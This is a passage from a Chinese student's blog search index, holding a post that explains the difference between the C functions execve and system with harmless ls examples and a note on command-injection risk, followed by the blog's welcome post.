        <content type="html"><![CDATA[<p><code>execve</code> 和 <code>system</code> 是两个常用的系统调用或库函数，用于在 Unix-like 操作系统中执行其他程序。它们有不同的用途和行为，下面详细解释它们的区别。</p><h3 id="execve-函数"><a href="#execve-函数" class="headerlink" title="execve 函数"></a><code>execve</code> 函数</h3><p><code>execve</code> 是一个系统调用，用于在当前进程空间中执行一个新的程序。其原型如下：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">execve</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *pathname, <span class="type">char</span> *<span class="type">const</span> argv[], <span class="type">char</span> *<span class="type">const</span> envp[])</span>;</span><br></pre></td></tr></table></figure><h4 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h4><ul><li><code>pathname</code>：要执行的程序的路径。</li><li><code>argv</code>：传递给新程序的参数数组。数组的第一个元素通常是程序名称，最后一个元素必须是NULL。</li><li><code>envp</code>：传递给新程序的环境变量数组，最后一个元素也必须是NULL。</li></ul><h4 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h4><ol><li><strong>直接替换当前进程</strong>：<code>execve</code> 调用成功后，当前进程的代码、数据和堆栈都被替换为新程序的内容，当前进程PID保持不变。</li><li><strong>没有返回</strong>：如果 <code>execve</code> 调用成功，当前进程不会返回到调用点。只有在调用失败时才会返回，并设置适当的错误码。</li><li><strong>更灵活</strong>：可以指定新程序的执行路径、参数和环境变量。</li></ol><h4 id="使用示例"><a href="#使用示例" class="headerlink" title="使用示例"></a>使用示例</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> *args[] = &#123; <span class="string">&quot;/bin/ls&quot;</span>, <span class="string">&quot;-l&quot;</span>, <span class="literal">NULL</span> &#125;;</span><br><span class="line"><span class="type">char</span> *env[] = &#123; <span class="literal">NULL</span> &#125;;</span><br><span class="line">execve(<span class="string">&quot;/bin/ls&quot;</span>, args, env);</span><br></pre></td></tr></table></figure><h3 id="system-函数"><a href="#system-函数" class="headerlink" title="system 函数"></a><code>system</code> 函数</h3><p><code>system</code> 是标准C库中的一个函数，用于通过调用 <code>/bin/sh</code> 来执行一个命令字符串。其原型如下：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">system</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *command)</span>;</span><br></pre></td></tr></table></figure><h4 id="参数-1"><a href="#参数-1" class="headerlink" title="参数"></a>参数</h4><ul><li><code>command</code>：要执行的命令字符串。</li></ul><h4 id="特点-1"><a href="#特点-1" class="headerlink" title="特点"></a>特点</h4><ol><li><strong>创建子进程</strong>：<code>system</code> 创建一个子进程来执行给定的命令字符串，父进程等待子进程执行完毕。</li><li><strong>依赖 shell</strong>：<code>system</code> 使用 <code>/bin/sh -c</code> 来执行命令，因此命令字符串可以包含任何 shell 支持的语法和命令。</li><li><strong>简单方便</strong>：适合执行简单的命令，但不如 <code>execve</code> 灵活。</li></ol><h4 id="返回值"><a href="#返回值" class="headerlink" title="返回值"></a>返回值</h4><ul><li>返回命令执行的状态码。如果命令执行失败或 <code>system</code> 调用失败，则返回非零值。</li></ul><h4 id="使用示例-1"><a href="#使用示例-1" class="headerlink" title="使用示例"></a>使用示例</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> status = system(<span class="string">&quot;ls -l&quot;</span>);</span><br></pre></td></tr></table></figure><h3 id="区别总结"><a href="#区别总结" class="headerlink" title="区别总结"></a>区别总结</h3><ol><li><p><strong>执行环境</strong>：</p><ul><li><code>execve</code>：替换当前进程的执行环境。</li><li><code>system</code>：在子进程中执行命令，父进程等待子进程完成。</li></ul></li><li><p><strong>灵活性</strong>：</p><ul><li><code>execve</code>：更灵活，可以直接指定程序路径、参数和环境变量。</li><li><code>system</code>：依赖 shell，适合执行简单的命令字符串。</li></ul></li><li><p><strong>依赖性</strong>：</p><ul><li><code>execve</code>：不依赖 shell。</li><li><code>system</code>：依赖 <code>/bin/sh</code>。</li></ul></li><li><p><strong>返回值和控制流</strong>：</p><ul><li><code>execve</code>：成功执行后不会返回；失败时返回错误码。</li><li><code>system</code>：返回子进程的状态码或错误码。</li></ul></li></ol><h3 id="适用场景"><a href="#适用场景" class="headerlink" title="适用场景"></a>适用场景</h3><ul><li>使用 <code>execve</code>：当需要精确控制新程序的执行环境时，如传递特定的参数和环境变量。</li><li>使用 <code>system</code>：当只需要执行一个简单的命令字符串，并不需要精细控制命令的执行环境时。</li></ul><h3 id="安全性"><a href="#安全性" class="headerlink" title="安全性"></a>安全性</h3><ul><li><code>system</code>：由于依赖 shell，存在命令注入风险，特别是在处理用户输入时需要格外小心。</li><li><code>execve</code>：不依赖 shell，因此更安全，但需要更复杂的调用参数。</li></ul><p>通过这些区别和特点，开发者可以根据具体需求选择合适的函数来执行外部程序。</p>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello呀~👏👏👏</title>
      <link href="/posts/c1e7930e/"/>
      <url>/posts/c1e7930e/</url>
      
        <content type="html"><![CDATA[<h1 id="🎉"><a href="#🎉" class="headerlink" title="🎉"></a>🎉</h1><p>欢迎来到我的小站~~~</p><p>（功能慢慢开发中哦 <strong>0.o</strong>）</p><h1 id="✨"><a href="#✨" class="headerlink" title="✨"></a>✨</h1><p>本人信安专业准大三在读📖📖📖</p><p>emmmmmmmmmmmmmmmm好早之前就打算搭建个博客了，奈何严重拖延症患者，也算是终于。。。这几天搞了个大概😊</p><p>以后就在小站上分享一下平常的ctf做题心得和安全方面相关知识了  lalalalalalllllllllllll</p><p>也随便记下生活中的事情</p><p>不喜勿喷o</p><p>敏感害羞腼腆社恐文静超i小女生一枚 <code>_oTATo_</code>(笔芯)❤️</p><h1 id="🚀"><a href="#🚀" class="headerlink" title="🚀"></a>🚀</h1><p>本人实在是实力有限，萌新一枚</p><p>不对的地方多多指导la⭐</p><p>也希望这个小破站能激励我多多写笔记，早日变成大佬！！！📣</p><h1 id="📚"><a href="#📚" class="headerlink" title="📚"></a>📚</h1><p>就这样吧，来，摆个pose</p><p>拍张照做个留念 </p><p>📷📷📷</p><p>Ok ，卷去咯 <strong>&gt;__&lt;</strong></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
